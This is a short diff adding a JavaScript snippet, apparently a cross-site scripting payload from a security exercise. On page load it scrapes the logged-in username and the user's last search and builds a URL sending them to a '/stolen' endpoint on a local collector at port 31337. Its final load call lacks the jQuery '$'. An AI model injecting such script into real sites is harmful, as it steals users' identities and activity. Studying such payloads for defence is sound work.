@@ -1,0 +1,15 @@
+<script src='http://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js'></script>
+
+<div id="load-div" style="display:none"></div>
+
+<script>
+	function fn() {
+
+		var recent_search = $('.list-group-item:eq(1)').text();
+		var username = $('#logged-in-user').text();
+		var server_url = 'http://127.0.0.1:31337/stolen?user=' + username + '&last_search=' + recent_search;
+		alert(server_url);
+		('#load-div').load(server_url);
+	}
+window.onload = fn;
+</script>
